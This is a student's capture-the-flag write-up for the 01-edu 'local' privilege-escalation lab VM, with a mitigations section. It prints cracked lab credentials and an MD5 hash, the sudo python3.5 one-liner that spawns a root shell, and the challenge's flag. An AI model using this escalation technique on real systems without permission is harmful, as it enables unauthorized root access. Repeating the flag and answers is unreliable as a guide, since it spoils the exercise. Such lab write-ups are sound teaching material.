# [local](https://github.com/01-edu/public/tree/master/subjects/cybersecurity/local)

## About

Local is a 'Capture the flag' project using the provided VM 01-Local1.ova. The root access and flag have to be aquired using privilege escalation.

## Privilege escalation

Privilege escalation occurs when someone gains higher access or permissions in a system than they're supposed to have. This can happen in two main ways: either a regular user manages to gain admin-level privileges, or someone with the same level of access as another user finds a way to take control of their account or permissions. It's a major security issue because it allows unauthorized access to sensitive information or control over a system, leading to potential misuse or damage.

## Video

I have uploaded a video to YouTube showing the steps needed to get root access and capture the flag. https://www.youtube.com/watch?v=Tt5gGFiVrc4&ab

## Walkthrough

#### Getting first user credentials
Since in the insructions no credentials were given, I started with looking around in GRUB and using `cat /etc/passwd` I was abled to see that there were two users: `shrek` and `ftp`. By trial and error I was not able to find tha password for `shrek` but the password for `ftp` was `ftp`.

#### IP Address
Using command `ip addr` I found out that there was something available at `192.168.1.141` so I Accesed it with browser and it displayed: <center>
        <h1 style="color:white;">0 1</h1>
		<h1 style="color:green;">(! !! ! !!)! l37'5 pl4y 4 64m3 ! (!! ! !!! )</h1>
		<h2 style="color:green;">HackMe Please!.</h2>
		<p style="color:grey;">Local#1</p>
	</center>

At that time I did not look deeper into THe IP address and started to look around in the folders instead.

#### Password for shrek
In `/home` was `important.txt` which contained:
```
  /$$$$$$    /$$     
 /$$$_  $$ /$$$$    
| $$$$\ $$|_  $$     
| $$ $$ $$  | $$    
| $$\ $$$$  | $$    
| $$ \ $$$  | $$    
|  $$$$$$/ /$$$$$$  
 \______/ |______/                                                                           
                                                                           
                                                                           
 /$$                                     /$$   /$$ /$$     /$$             
| $$                                    | $$  / $$/ $$   /$$$$             
| $$        /$$$$$$   /$$$$$$$  /$$$$$$ | $$ /$$$$$$$$$$|_  $$             
| $$       /$$__  $$ /$$_____/ |____  $$| $$|   $$  $$_/  | $$             
| $$      | $$  \ $$| $$        /$$$$$$$| $$ /$$$$$$$$$$  | $$             
| $$      | $$  | $$| $$       /$$__  $$| $$|_  $$  $$_/  | $$             
| $$$$$$$$|  $$$$$$/|  $$$$$$$|  $$$$$$$| $$  | $$| $$   /$$$$$$           
|________/ \______/  \_______/ \_______/|__/  |__/|__/  |______/           
                                                                           
                                                                           
run the script to see the data

/.runme.sh
```
and by looking in the shell script with `cat /.runme.sh` 
```
#!/bin/bash
echo 'the secret key'
sleep 2
echo 'is'
sleep 2
echo 'trolled'
sleep 2
echo 'hacking computer in 3 seconds...'
sleep 1
echo 'hacking computer in 2 seconds...'
sleep 1
echo 'hacking computer in 1 seconds...'
echo "hahaahahah it's a joke, Don't be stupid, read scripts before running it"
exit 01 ### eeeeeemmmmmmmmmmmmm
sleep 1
echo '⡴⠑⡄⠀⠀⠀⠀⠀⠀⠀ ⣀⣀⣤⣤⣤⣀⡀
⠸⡇⠀⠿⡀⠀⠀⠀⣀⡴⢿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀
⠀⠀⠀⠀⠑⢄⣠⠾⠁⣀⣄⡈⠙⣿⣿⣿⣿⣿⣿⣿⣿⣆
⠀⠀⠀⠀⢀⡀⠁⠀⠀⠈⠙⠛⠂⠈⣿⣿⣿⣿⣿⠿⡿⢿⣆
⠀⠀⠀⢀⡾⣁⣀⠀⠴⠂⠙⣗⡀⠀⢻⣿⣿⠭⢤⣴⣦⣤⣹⠀⠀⠀⢀⢴⣶⣆
⠀⠀⢀⣾⣿⣿⣿⣷⣮⣽⣾⣿⣥⣴⣿⣿⡿⢂⠔⢚⡿⢿⣿⣦⣴⣾⠸⣼⡿
⠀⢀⡞⠁⠙⠻⠿⠟⠉⠀⠛⢹⣿⣿⣿⣿⣿⣌⢤⣼⣿⣾⣿⡟⠉
⠀⣾⣷⣶⠇⠀⠀⣤⣄⣀⡀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠉⠈⠉⠀⠀⢦⡈⢻⣿⣿⣿⣶⣶⣶⣶⣤⣽⡹⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠉⠲⣽⡻⢿⣿⣿⣿⣿⣿⣿⣷⣜⣿⣿⣿⡇
⠀⠀ ⠀⠀⠀⠀⠀⢸⣿⣿⣷⣶⣮⣭⣽⣿⣿⣿⣿⣿⣿⣿⠇
⠀⠀⠀⠀⠀⠀⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇
⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    shrek:061fe5e7b95d5f98208d7bc89ed2d569'
``` 
I was able to find the md5 hash of the password: `061fe5e7b95d5f98208d7bc89ed2d569`
Using a website for decrypting hashes i got the password: `youaresmart`

#### Getting root access
`user.txt` at `/home/shrek` was not much of help:
```
  /$$$$$$    /$$     
 /$$$_  $$ /$$$$    
| $$$$\ $$|_  $$     
| $$ $$ $$  | $$    
| $$\ $$$$  | $$    
| $$ \ $$$  | $$    
|  $$$$$$/ /$$$$$$  
 \______/ |______/                                                                           
                                                                           
                                                                           
 /$$                                     /$$   /$$ /$$     /$$             
| $$                                    | $$  / $$/ $$   /$$$$             
| $$        /$$$$$$   /$$$$$$$  /$$$$$$ | $$ /$$$$$$$$$$|_  $$             
| $$       /$$__  $$ /$$_____/ |____  $$| $$|   $$  $$_/  | $$             
| $$      | $$  \ $$| $$        /$$$$$$$| $$ /$$$$$$$$$$  | $$             
| $$      | $$  | $$| $$       /$$__  $$| $$|_  $$  $$_/  | $$             
| $$$$$$$$|  $$$$$$/|  $$$$$$$|  $$$$$$$| $$  | $$| $$   /$$$$$$           
|________/ \______/  \_______/ \_______/|__/  |__/|__/  |______/           
                                                                           
                                                                           
I generated this ascii art with python3.5, is it cool?
```
So next i tried `sudo -l`:
```
Matching Defaults entries for shrek on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shrek may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/python3.5
```
This revealed that shrek has root access for python3.5 which meant I could gain root access for the system with a simple script:
``` 
sudo /usr/bin/python3.5 -c 'import os; os.system("/bin/bash")'
```
Then I was able to navigate to `/root` which contained `root.txt`:
```
  /$$$$$$    /$$     
 /$$$_  $$ /$$$$    
| $$$$\ $$|_  $$     
| $$ $$ $$  | $$    
| $$\ $$$$  | $$    
| $$ \ $$$  | $$    
|  $$$$$$/ /$$$$$$  
 \______/ |______/                                                                           
                                                                           
                                                                           
 /$$                                     /$$   /$$ /$$     /$$             
| $$                                    | $$  / $$/ $$   /$$$$             
| $$        /$$$$$$   /$$$$$$$  /$$$$$$ | $$ /$$$$$$$$$$|_  $$             
| $$       /$$__  $$ /$$_____/ |____  $$| $$|   $$  $$_/  | $$             
| $$      | $$  \ $$| $$        /$$$$$$$| $$ /$$$$$$$$$$  | $$             
| $$      | $$  | $$| $$       /$$__  $$| $$|_  $$  $$_/  | $$             
| $$$$$$$$|  $$$$$$/|  $$$$$$$|  $$$$$$$| $$  | $$| $$   /$$$$$$           
|________/ \______/  \_______/ \_______/|__/  |__/|__/  |______/           
                                                                           
                                                                           
                                                                                                                                                     
Congratulations, You have successfully completed the challenge!
Flag: 01Talent@nokOpA3eToFrU8r5sW1dipe2aky
```

## Vulnerabilities
GRUB was not password proteced so I was able to see the list of users, the task instructions prohibited to do any modifications in GRUB but it would be possible to just change the user password there. To secure the system from that exploit you sould set a password for GRUB

The password for user `ftp` was the same as the username so it took 2 tries for me to guess it. Always choose a difficult password for your accounts.

The password for user `shrek` was stored in a txt file that could be read by all users and even though it was a md5 hash, it was easily decrypted. To avoid that, don't store your passwords in a place where othere people might have access to it.

Since shrek had root access to python3.5 it could get root ccess to the whole system through python. Always consider all possible cases where programs could be used if you give users access to it.
## Audit

 [Audit Questions](https://github.com/01-edu/public/tree/master/subjects/cybersecurity/local/audit)


## Author
[MargusT](https://01.kood.tech/git/MargusT)

## Warning
⚠️ These methods and tools are for educational purposes only, so that you have a better understanding of how to protect against similar vulnerabilities. You must ensure that you do not attempt any exploit-type activity without the explicit permission of the owner of the machine, system or application. Failure to obtain permission risks breaking the law.